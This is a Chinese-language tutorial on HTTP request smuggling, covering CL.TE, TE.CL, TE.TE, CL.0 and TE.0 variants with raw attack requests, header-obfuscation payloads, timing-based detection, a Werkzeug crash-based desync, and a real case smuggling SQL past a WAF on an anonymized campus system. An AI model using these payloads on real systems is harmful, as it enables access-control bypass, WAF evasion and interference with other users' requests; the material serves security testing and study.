# HTTP Request Smuggling / HTTP Desync Attack

# 0X01 什么是 HTTP 请求走私 / HTTP 异步攻击

当**前端代理**与**后端服务器**之间发生**不同步**时，允许**攻击者**发送一个**HTTP 请求**，该请求将被**前端代理**（负载均衡/反向代理）视为**单个请求**，而被**后端服务器**视为**两个请求**。这使得攻击者能够**修改到达后端服务器的下一个请求**。

## 1.1 理论基础

1. [**RFC 规范 (2161)**](https://tools.ietf.org/html/rfc2616)
   
   1. 如果收到的消息同时包含 `Transfer-Encoding` 头字段和 `Content-Length` 头字段，则后者必须被忽略。
   
2. **Content-Length**
   1.  `Content-Length` 实体头指示发送给接收者的实体主体的大小（以字节为单位）。
   2.  `Content-Length` 实体头的指示包括不可见字符，即不可见字符也要求被计算字节长度。如 `name=admin\r\n`，`CL = 12`

3. **Transfer-Encoding: chunked**
   1. `Transfer-Encoding` 头指定用于安全传输有效负载主体的编码形式。
   2. `Chunked` 意味着大数据以一系列块的形式发送。
   3. `chunk-size` 和 `last-chunk` 不纳入 `chunk-data` 的长度计算，`chunk-data` 后面必须接 `CRLF` 表示内容结束。 
   4. `chunk-size` 计算不包括表示结束的 `CRLF`

   ```http
   # chunked-body   = *chunk
   #             last-chunk
   #             trailer-part
   #             CRLF
   
   # chunk          = chunk-size [ chunk-ext ] CRLF
   #             chunk-data CRLF
   # chunk-size     = 1*HEXDIG
   # last-chunk     = 1*("0") [ chunk-ext ] CRLF
   
   POST / HTTP/1.1
   Host: YOUR-LAB-ID.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   Content-length: 4
   Transfer-Encoding: chunked
   Transfer-encoding: cow
   
   5c/r/n                                                👈 chunk-size 分块头：16进制长度 + 可选扩展参数
   GPOST / HTTP/1.1/r/n
   Content-Type: application/x-www-form-urlencoded/r/n
   Content-Length: 15/r/n
   /r/n
   x=1/r/n                                               👈 分块数据（长度需严格等于声明的字节数）,以 CRLF 结束
   0/r/n                                                 👈 终止块（可选头部+空数据）
   /r/n                                                  👈 最终结束符
   ```


## 1.2 现实问题

**前端**（负载均衡/反向代理）**处理** _**content-length**_ 或 _**transfer-encoding**_ 头，而**后端**服务器**处理另一个**，导致两个系统之间发生**不同步**。

这可能非常关键，因为**攻击者将能够向反向代理发送一个请求**，该请求将被**后端**服务器**视为两个不同的请求**。这种技术的**危险**在于**后端**服务器**将解释**注入的**第二个请求**，仿佛它**来自下一个客户端**，而该客户端的**真实请求**将成为**注入请求**的一部分。

### 特点

请记住，在HTTP中**换行符由2个字节（CRLF）组成：**

- **Content-Length**：此头使用**十进制数字**指示请求**主体**的**字节数**。主体预计在最后一个字符结束，**请求末尾不需要换行**。
- **Transfer-Encoding:** 此头在**主体**中使用**十六进制数字**指示**下一个块**的**字节数**。**块**必须以**换行**结束，但此换行**不计入**长度指示器。此传输方法必须以**大小为0的块后跟2个换行**结束：`0`
- **Connection**：根据我的经验，建议在请求走私的第一个请求中使用 **`Connection: keep-alive`**。

# 0X02 基本示例

> [!TIP]
> 在尝试使用 Burp Suite 进行利用时，**禁用 `Update Content-Length` 和 `Normalize HTTP/1 line endings`**，因为某些工具滥用换行符、回车和格式错误的内容长度。同时，记得使用`HTTP/1.1`

HTTP 请求走私攻击是通过发送模棱两可的请求来构造的，这些请求利用前端和后端服务器在解释`Content-Length`(**CL**)和`Transfer-Encoding`(**TE**)头时的差异。这些攻击可以以不同形式表现，主要为 **CL.TE**、**TE.CL** 和 **TE.TE**。每种类型代表前端和后端服务器如何优先处理这些头的独特组合。漏洞源于服务器以不同方式处理相同请求，导致意外和潜在的恶意结果。

---

**TYPE 表**

| 类型    | 请求示例                                                                                                                                                                                                                                 | 前端代理服务器                                                                 | 后端服务器                                                                 |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **CL.0** | `GET / HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`Content-Length: 44\r\n`<br><br>`GET /test HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`\r\n`                                                                                    | ✔️ 检查 Content-Length | ❌ 不检查 Content-Length |
| **TE.0** | `OPTIONS / HTTP/1.1`<br>`Host: {HOST}`<br>`Accept-Encoding: gzip, deflate, br`<br>`Accept: */*`<br>`Accept-Language: en-US;q=0.9,en;q=0.8`<br>`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36`<br>`Transfer-Encoding: chunked`<br>`Connection: keep-alive`<br><br>`50`<br>`GET <http://our-collaborator-server/> HTTP/1.1`<br>`x: X`<br>`0`<br>`EMPTY_LINE_HERE`<br>`EMPTY_LINE_HERE` | ✔️ 检查 Transfer-Encoding | ❌ 不检查 Transfer-Encoding？具体解释详见 [TE.0 场景](## 2.6 TE.0) |
| **CL-CL** | `POST / HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`Content-Length: 8\r\n`<br>`Content-Length: 7\r\n`<br><br>`12345\r\n`<br>`a`                                                                                                    | ✔️ 检查第一个 Content-Length（值为 8）          | ❌ 采用第二个 Content-Length（值为 7）             |
| **CL-TE** | `POST / HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`Connection: keep-alive\r\n`<br>`Content-Length: 6\r\n`<br>`Transfer-Encoding: chunked\r\n`<br>`\r\n`<br>`0\r\n`<br>`\r\n`<br>`G`                                                                                     | ✔️ 优先检查 Content-Length（值为 6）<br>忽略 `Transfer-Encoding`处理请求头 | ❌ 采用 `Transfer-Encoding: chunked`<br>处理分块数据<br>接受 `Transfer-Encoding` 头部         |
| **TE-CL** | `POST / HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`Content-Length: 4\r\n`<br>`Transfer-Encoding: chunked\r\n`<br>`\r\n`<br>`12\r\n`<br>`GPOST / HTTP/1.1\r\n`<br>`\r\n`<br>`0\r\n`<br>`\r\n`                                               | ✔️ 优先检查 `Transfer-Encoding`<br>处理分块数据（值为 12）<br>忽略后续请求注入             | ❌ 采用 `Content-Length: 4`<br>处理后续注入的 `POST` 请求         |
| **TE-TE** | `POST / HTTP/1.1\r\n`<br>`Host: spidersec.local\r\n`<br>`Content-Length: 4\r\n`<br>`Transfer-Encoding: chunked\r\n`<br>`Transfer-encoding: cow\r\n`<br>`\r\n`<br>`5c\r\n`<br>`GPOST / HTTP/1.1\r\n`<br>`Content-Type: application/x-www-form-urlencoded\r\n`<br>`Content-Length: 15\r\n`<br>`\r\n`<br>`x=1\r\n`<br>`0\r\n`<br>`\r\n` | ✔️ 解析第一个 `Transfer-Encoding`（chunked）<br>忽略冗余头部<br>处理分块数据（值为 5c）       | ❌ 解析第二个 `Transfer-Encoding`（cow）<br>但是 cow 为非标准编码类型，后端服务器被迫接受`Content-Length: 4`    |

---

> [!NOTE]
> 在前面的表中，您应该添加TE.0技术，类似于CL.0技术，但使用 `Transfer Encoding`。

---

## 2.1 CL.TE

- **前端 (CL)：** 根据`Content-Length`头处理请求。
- **后端 (TE)：** 根据`Transfer-Encoding`头处理请求。
- **攻击场景：**
  - 攻击者构造一个**同时包含 `Content-Length` 和 `Transfer-Encoding: chunked` 的请求**，且：
    1. 请求体包含**合法的分块终止符**（`0\r\n\r\n`），用于欺骗后端结束当前请求。
    2. `Content-Length` 的值设置为**分块终止符字节数 + 走私数据的字节数**，迫使前端读取并转发全部数据。
  - 前端根据 `Content-Length` 读取完整的请求体（包括分块终止符后的走私数据），并将其转发至后端。
  - 后端解析到分块终止符后，认为当前请求已结束，剩余的走私数据滞留缓冲区，**被当作下一个独立请求处理**。
- **示例：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30                <!-- 分块终止符5字节 + 走私数据25字节 -->
Connection: keep-alive
Transfer-Encoding: chunked

0
                                  <!-- 分块终止符（5字节） -->
GET /404 HTTP/1.1
Foo: x                            <!-- 走私数据（25字节） -->
```

---

## 2.2 TE.CL

- **前端 (TE)：** 根据`Transfer-Encoding`头处理请求。
- **后端 (CL)：** 根据`Content-Length`头处理请求。
- **攻击场景：**

- 攻击者发送一个分块请求，其中块大小（`7b`）和实际内容长度（`Content-Length: 4`）不一致，该**实际长度**是指后端接收到的内容长度。
- 前端服务器遵循`Transfer-Encoding`，将整个请求转发给后端。
- 后端服务器遵循`Content-Length`，仅处理请求的初始部分（`7b\r\n`），将其余部分视为后续请求的一部分。
- **示例：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

---

## 2.3 TE.TE

- **服务器：** 两者都支持`Transfer-Encoding`，但一个可以通过混淆被欺骗以忽略它。
- **攻击场景：**

- 攻击者发送一个带有混淆`Transfer-Encoding`头的请求。
- 根据哪个服务器（前端或后端）未能识别混淆，可能会利用CL.TE或TE.CL漏洞。即混淆的头部导致前端或后端处理出现问题，导致其被迫接受 CL 对数据长度指示。
- 请求中未处理的部分，作为其中一个服务器所见，成为后续请求的一部分，导致走私。
- **示例：**

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
- **混淆 Payload：**
```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

---

## 2.4 CL.CL

- 两个服务器仅根据`Content-Length`头处理请求。
- 前端选择其中一个 CL 进行处理，而后端使用另一个。
- 这种情况通常不会导致走私，因为两个服务器在解释请求长度时是一致的。
- **示例：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 10
Content-Length: 7
Connection: keep-alive

aaaaa
bbb
```

---

## 2.5 CL.0

- 指的是`Content-Length`头存在且值不为零，表示请求主体有内容。后端忽略`Content-Length`头（被视为0），但前端解析它。
- 这在理解和构造走私攻击中至关重要，因为它影响服务器确定请求结束的方式。
- **示例：**

```http
POST /resources/images/blog.svg HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Connection: keep-alive
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x

```

---

## 2.6 TE.0

- 类似于前一个场景，但使用TE。
  - 指的是`Transfer-Encoding`头存在且为`chunked`，表示请求主体有内容。
- [关于 TE.0 起作用的猜测](https://www.linkedin.com/posts/james-kettle-albinowax_unveiling-te0-http-request-smuggling-discovering-activity-7219606594211192832-rT6-)
  - 猜测一：后端忽略`Content-Length`头，前端转发时删除了POST数据的第一行，或后端忽略了POST数据的第一行，如示例中的 `chunk-size` 行。
  - 猜测二：前端服务器正在重写分块消息体以通过 `Content-Length` 进行传输，但忘记设置 `Content-Length` 标头。此过程将会删除 `chunk-size` 和 `last-chunk` 部分 ，只保留 `chunk-data` 部分，此种可能性更大。
- 技术[在此报告](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)：技术报告中提到在 TE.0 攻击中 `GET` 和 `POST` 都失败了，只有 `OPTIONS` 生效，出问题的云商都是 google，所以猜测二提及的行为估计和 google 针对特定请求方法的行为有关。
- **示例**:

```http
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50                                                 👈 chunk-size
GET <http://our-collaborator-server/> HTTP/1.1
x: X                                               👈 chunk-data
0
EMPTY_LINE_HERE                                    👈 last-chunk
EMPTY_LINE_HERE
```
#### 2.6.1 真实的 TE.0 案例

某学院智慧校园系统存在 ***请求走私漏洞（TE.0 ）*** 。当请求头包含 `Transfer-Encoding: chunked`，某个中间设备会重写请求（是因为 `XContent-Type: multipart/form-data`诱发了重写行为？），关于重写规则有以下两种猜想：

1. 重写请求，将 `TE` 重写为 `CL`，并且将 `CL` 设置为 0。
2. 重写请求，将 `TE` 重写为 `CL`，没有添加 `CL` 头。

基于以下测试情况，更倾向于第一种猜想。因为在 ***请求走私-1***中，已经存在 `CL` 头，所谓 ***"没有添加`CL`头"***并不那么经得起推敲：

- 请求走私-1

```http
POST /signup/request/component HTTP/1.1
Host: xx.xx.cn
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581
Content-Type: application/x-www-form-urlencoded
XContent-Type: multipart/form-data
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Transfer-Encoding: chunked
Content-Length: 798

312
POST /signup/request/component HTTP/1.1
Host: xx.xx.cn
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
XContent-Type: multipart/form-data
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 500

className=com.xx.xx.xx.BaseBPO&x=x&methodName=GetOptions4Json&params={"entityClassName":"com.xx.baseinfo.model.xx","textField":"account","valueField":"account","filters":[],"searchMode":"static","searchText":null,"sql":"select * from ds_user/*
0


```

- 请求走私-2
```http
GET / HTTP/1.1
User-Agent: */where ID='202408281744'","values":null,"orderBys":[],"topCount":500,"distinct":false}&types=0
Host: xx.xx.cn
Cookie: JSESSIONID=5CE15C63A6ACC83C5CF5D9B7B89B1C91
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua: "Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,ja-JP;q=0.5,ja;q=0.4
Dnt: 1
Sec-Gpc: 1
Priority: u=0, i
Connection: keep-alive


```

由于存在 **请求走私（TE.0）**， **请求走私-1** 在后端会被视为两个请求，但是在 WAF 眼中这只是一个没有触发规则的奇怪请求包。所以通过了 WAF 检测。然后被走私请求的 `CL` 被设置为 `500`，该设置会迫使后端吞并 **请求走私-2** 数据，直至长度满足 `500`，此时只要精心构造 **请求走私-2** ，就可绕过 WAF 进行漏洞利用。正如上面的请求示例，实际上后端接收到的被走私请求的完整请求为：

```http
POST /signup/request/component HTTP/1.1
Host: xx.xx.cn
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
XContent-Type: multipart/form-data
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 500

className=com.xx.framework.xx.xx&x=x&methodName=GetOptions4Json&params={"entityClassName":"com.xx.baseinfo.model.xx","textField":"account","valueField":"account","filters":[],"searchMode":"static","searchText":null,"sql":"select * from ds_user/*
0

GET / HTTP/1.1
User-Agent: */where ID='202408281744'","values":null,"orderBys":[],"topCount":500,"distinct":false}&types=0
```

执行的 SQL 语句为：
```sql
select * from ds_user/*
0

GET / HTTP/1.1
User-Agent: */where ID='202408281744'
```

### 其他利用场景

#### 通过破坏网络服务器触发请求走私

此技术在某些场景中也很有用，在这些场景中，可以**在读取初始HTTP数据时破坏网络服务器**，但**不关闭连接**。这样，HTTP请求的**主体**将被视为**下一个HTTP请求**。

例如，如[**这篇文章**](https://mizu.re/post/twisty-python)中所述，在Werkzeug中，可以发送一些**Unicode**字符，这会导致服务器**崩溃**。然而，如果HTTP连接是使用 **`Connection: keep-alive`** 头创建的，请求的主体将不会被读取，连接仍将保持打开状态，因此请求的**主体**将被视为**下一个HTTP请求**。

[**twisty-python**](https://mizu.re/post/twisty-python) 文章中请求走私的原理:

WSGI 对“请求头”和“请求体”的处理机制
   - 请求头：
     - 服务器启动后，当一个新的 HTTP 连接到来时，WSGI 服务器会先同步地读取并解析请求头，获取方法（`GET`、`POST` 等）、路径、查询参数、`Content-Length/Transfer-Encoding` 等。
     - 解析完成后，服务器将这些信息存储进 `environ`（WSGI 规范下的环境变量字典），然后再将控制权交给你的 WSGI 应用（例如 Flask 应用）。
   - 请求体（Body）
     - 对于请求体，WSGI 规范约定，服务器会在 environ 中提供一个可读的文件流对象（即 wsgi.input），应用需要时才去从里面读取数据。
     - 换言之，如果你的 Flask 视图函数根本没有访问诸如 request.data、request.form、request.files 等，底层服务器就不会把请求体的全部数据一次性读到内存里，而是留在 TCP 或其他底层缓存中，只有当你调用这些方法才会触发对 `wsgi.input` 的实际读取。这个行为可以理解为 **“懒读取”（lazy loading）** 或 “按需读取”。

1. 应用程序没有主动读取请求体。
2. `Connection: keep-alive` + 编码错误导致应用程序无法执行 `self.end_headers()`，TCP 连接处于一直被打开状态。
3. `WSGIRequestHandler.run_wsgi().execute()` 数据清理机制存在问题，`while selector.select(timeout=0.01)` 条件中 `timeout` 设置不合理。调试过程中发现只要不主动读取请求体，`while selector.select(timeout=0.01)` 条件就一定被跳过，导致请求体并没有被成功清除，残留在缓存中。所以，一旦应用程序没有执行 `self.end_headers()`，必触发请求走私漏洞。
```python
def execute(app: WSGIApplication) -> None:
        application_iter = app(environ, start_response)
        try:
            for data in application_iter:
                write(data)
            if not headers_sent:
                write(b"")
            if chunk_response:
                self.wfile.write(b"0\r\n\r\n")
        finally:
            # Check for any remaining data in the read socket, and discard it. This
            # will read past request.max_content_length, but lets the client see a
            # 413 response instead of a connection reset failure. If we supported
            # keep-alive connections, this naive approach would break by reading the
            # next request line. Since we know that write (above) closes every
            # connection we can read everything.
            selector = selectors.DefaultSelector()
            selector.register(self.connection, selectors.EVENT_READ)
            total_size = 0
            total_reads = 0

            # A timeout of 0 tends to fail because a client needs a small amount of
            # time to continue sending its data.
            while selector.select(timeout=0.01):
                # Only read 10MB into memory at a time.
                # data = self.rfile.read(10_000_000)
                print("[DEBUG] Enter finally block")
                data = self.rfile.read(10_000_000)
                print(f"[DEBUG] Read from rfile: {data}")
                total_size += len(data)
                total_reads += 1

                # Stop reading on no data, >=10GB, or 1000 reads. If a client sends
                # more than that, they'll get a connection reset failure.
                if not data or total_size >= 10_000_000_000 or total_reads > 1000:
                    break

            selector.close()

            if hasattr(application_iter, "close"):
                application_iter.close()
```
4. Werkzeug 的默认错误处理会发送一个 200 OK 状态行（无 headers/body），这个「伪响应」会立即通过 TCP 发送给客户端。
```http
POST /api?action=color&color=x%ef%bf%bex&callback=xxxxxxxxxxxxxxxxx HTTP/1.1
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
accept-encoding: gzip, deflate, br, zstd
accept-language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-HK;q=0.6,ja-JP;q=0.5,ja;q=0.4
cache-control: no-cache
connection: keep-alive
cookie: session=eyJzY29yZXMiOltdfQ.Z9z_Og.sa4-tWpoqeqCI5ZrX0IK6JjTKTw
dnt: 1
host: 127.0.0.1:8000
pragma: no-cache
sec-ch-ua: "Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: none
sec-fetch-user: ?1
sec-gpc: 1
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

GET /sing3r HTTP/1.1
host: 127.0.0.1:8000

############### 请求响应分割 ###############

HTTP/1.1 200 OK
Server: Werkzeug/3.0.1 Python/3.11.9
Date: Sun, 23 Mar 2025 11:41:34 GMT
Content-Type: text/plain
Content-Length: 17

HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.0.1 Python/3.11.9
Date: Sun, 23 Mar 2025 11:43:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 207
Connection: close

<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

至于为什么程序没有在时间窗口内读取到残留的请求数据？以下是来自 AI 的解释：
> 在标准的 WSGI 规范里，environ 中会包含一个名为 wsgi.input 的键，对应一个可读的类文件（file-like object）。**但这并不意味着“请求体的全部内容已经在 environ 里”**。更准确的说法是：
> 1. **wsgi.input 是一个“输入流”**
>   - 它是一个可以被应用读取的“接口”，并不保证所有请求体数据都已完整存储在内存里。
>   - 具体实现取决于服务器：有的服务器会在读取并解析完 HTTP 头后，把请求体缓存在内存或临时文件里，再通过 wsgi.input 提供给应用；也有的服务器会在应用第一次调用 wsgi.input.read() 时，再从 TCP 套接字“按需”读取数据。
> 2. **存在于 environ”并不代表“完整缓存”**
>   - 当 WSGI 服务器初始化请求环境（environ）时，它就把 wsgi.input 这个键放进去——这是 WSGI 规范要求的，方便应用后续读取数据。
>   - 但这仅意味着“有一个可读的流可供应用使用”，并不等于“请求体数据已经全部读完并放在 environ 之中”。
>   - 言之，environ["wsgi.input"] 通常只是一个指向底层流或缓冲区的“包装”对象，何时将数据真正取出、取多少，都要看服务器及应用的交互过程。
> 3. **不同服务器的行为各异**
>   - 一些服务器（如 Gunicorn 等）可能在一定大小阈值内把请求体全部读到内存或临时文件，然后应用再通过 wsgi.input 读取实际上已缓存的数据。
>   - 另一些（或同一服务器的不同配置）可能按需从 TCP socket 里边读边交给 wsgi.input。
>   - 开发服务器（例如 Werkzeug 内置的 run_simple）通常会简化某些流程，但在任何情况下,wsgi.input 依然只是一个符合“文件-like”接口的对象，保证应用可以 .read() 等方法来获取请求体。
> 
>**小结**
> 
> **“environ 中提供一个可读的文件流对象，即 wsgi.input”**
> 
> 这句话是正确的，符合 WSGI 规范。
> 
> **“也就是说请求体已经在初始化 environ 之后就存储在 environ 中”**
> 
> 这句话需要更精准：
>   - WSGI 规范只要求 `environ["wsgi.input"]` 是可以读取请求体的对象，但不保证“所有数据都已完整放在内存或 environ 本身”。
>   - 实际上，只是“在 environ 创建时，就把读取请求体的方法（流）放进去了”，请求体数据可能在后续（第一次或多次 .read() 时）才真正从底层 socket 或缓存中被取到应用里。
> 
> **因此，更贴切的描述是：**
> 
> WSGI 服务器在解析完请求头后，会在 environ 里放置 wsgi.input 这个文件流对象。应用若需要请求体，就会调用该流的 read() 方法来获取，数据可能在服务器端做过部分或全部缓存，也可能是实时从网络读取，并不一定在创建 environ 的那一刻就已经完整“存储”到内存中。

   

#### 通过 hop-by-hop header 强制触发请求走私

滥用 `hop-by-hop header`，您可以指示代理**删除 Content-Length 或 Transfer-Encoding 头，以便可以滥用 HTTP 请求走私**。
```http
Connection: Content-Length
```
对于**有关逐跳头部的更多信息**，请访问：

[滥用 hop-by-hop 请求头]("./滥用\ hop-by\ hop-请求头.md")

# 0x03 发现 HTTP 请求走私

识别 HTTP 请求走私漏洞通常可以通过时间技术实现，这依赖于观察服务器响应被操纵请求所需的时间。这些技术对于检测 CL.TE 和 TE.CL 漏洞特别有用。除了这些方法，还有其他策略和工具可以用来查找此类漏洞：

## 3.1 基于响应时间发现 CL.TE 漏洞

- **方法：**
  - 发送一个请求，如果应用程序存在漏洞，将导致后端服务器等待额外数据。

- **示例：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **观察：**
  - 前端服务器根据 `Content-Length` 处理请求，并提前截断消息。
  - 后端服务器期望接收分块消息，等待下一个从未到达的块，导致延迟。

- **指标：**
  - 响应超时或长时间延迟。
  - 从后端服务器收到 400 Bad Request 错误，有时附带详细的服务器信息。

## 3.2 基于响应时间发现 TE.CL 漏洞

- **方法：**
  - 发送一个请求，如果应用程序存在漏洞，将导致后端服务器等待额外数据。
  
- **示例：**

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **观察：**
  - 前端服务器根据 `Transfer-Encoding` 处理请求并转发整个消息。
  - 后端服务器期望根据 `Content-Length` 接收消息，等待从未到达的额外数据，导致延迟。

- **指标：**
  - 响应超时或长时间延迟。
  - 从后端服务器收到 400 Bad Request 错误，有时附带详细的服务器信息。

## 3.3 其他发现方法

- **差异响应分析：**
  - 发送略有不同版本的请求，观察服务器响应是否以意外方式不同，指示解析差异。
- **使用自动化工具：**
  - 像 Burp Suite 的 **HTTP Request Smuggler** 扩展可以通过发送各种模糊请求并分析响应，自动测试这些漏洞。
- **Content-Length 变异测试：**
  - 发送具有不同 `Content-Length` 值的请求，这些值与实际内容长度不一致，并观察服务器如何处理此类不匹配。
- **Transfer-Encoding 变异测试：**
  - 发送具有模糊或格式错误的 `Transfer-Encoding` 头的请求，并监控前端和后端服务器对这种操控的不同响应。

# 0x04 漏洞测试及确认

在确认时间技术有效性后，验证客户端请求是否可以被操控至关重要。一种简单的方法是尝试毒化您的请求，例如，使对 `/` 的请求返回 404 响应。可在 [基本示例](#基本示例) 中讨论的 `CL.TE` 和 `TE.CL` 示例参考如何毒化客户端请求以引发 404 响应。

**关键考虑事项**

在通过干扰其他请求测试请求走私漏洞时，请记住：

- **独立的网络连接：** “攻击”和“正常”请求应通过独立的网络连接发送。对两个请求使用相同的连接并不能验证漏洞的存在。
- **一致的 URL 和参数：** 力求对两个请求使用相同的 URL 和参数名称。现代应用程序通常根据 URL 和参数将请求路由到特定的后端服务器。匹配这些可以增加两个请求由同一服务器处理的可能性，这是成功攻击的前提。
- **时间和竞争条件：** “正常”请求旨在检测“攻击”请求的干扰，与其他并发应用请求竞争。因此，在“攻击”请求后立即发送“正常”请求。繁忙的应用程序可能需要多次尝试以确认漏洞。
- **负载均衡挑战：** 作为负载均衡器的前端服务器可能会将请求分配到不同的后端系统。如果“攻击”和“正常”请求最终落在不同的系统上，攻击将不会成功。这个负载均衡方面可能需要多次尝试以确认漏洞。
- **意外用户影响：** 如果您的攻击无意中影响了另一个用户的请求（不是您发送的“正常”请求），这表明您的攻击影响了另一个应用用户。持续测试可能会干扰其他用户，因此需要谨慎处理。

# 0x05 滥用 HTTP 请求走私
## 5.1 通过 HTTP 请求走私绕过前端安全机制

有时，前端代理会强制实施安全措施，仔细检查所有传入请求。然而，这些措施可以通过 HTTP 请求走私（HTTP Request Smuggling）进行绕过，从而实现对受限制端点的未授权访问。

例如，对外部访问 /admin 路径的请求可能被禁止，前端代理会主动拦截此类尝试。然而，代理可能没有检查隐藏在走私 HTTP 请求中的嵌入式请求，从而留下了一个可以绕过这些限制的漏洞。

#### 案例演示：绕过前端安全控制

以下示例展示了如何通过 HTTP 请求走私绕过前端安全控制，特别是针对通常受前端代理保护的 /admin 路径。

- CL.TE 攻击示例
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
在 `CL.TE` 攻击中，`Content-Length` 头用于初始请求，而后续嵌入请求则利用 `Transfer-Encoding: chunked` 头。前端代理处理初始 `POST` 请求，但未能检查嵌入的 `GET /admin` 请求，从而允许未经授权访问 `/admin` 路径。

- TE.CL 攻击示例
```http
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```

相反，在TE.CL攻击中，初始的`POST`请求使用`Transfer-Encoding: chunked`，而后续的嵌入请求则基于`Content-Length`头进行处理。与CL.TE攻击类似，前端代理忽视了被隐藏的`GET /admin`请求，意外地授予了对受限`/admin`路径的访问。

## 5.2 揭示前端请求重写

应用程序通常使用**前端服务器**来修改传入请求，然后将其传递给后端服务器。典型的修改涉及添加头部，例如`X-Forwarded-For: <IP of the client>`，以将客户端的IP转发给后端。理解这些修改可能至关重要，因为它可能揭示**绕过保护**或**发现隐藏的信息或端点**的方法。

要调查代理如何更改请求，找到一个后端在响应中回显的POST参数。然后，构造一个请求，使用这个参数作为最后一个，类似于以下内容：
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
在这个结构中，后续请求组件被附加在 `search=` 之后，这是在响应中反映的参数。这个反射将暴露后续请求的头部。
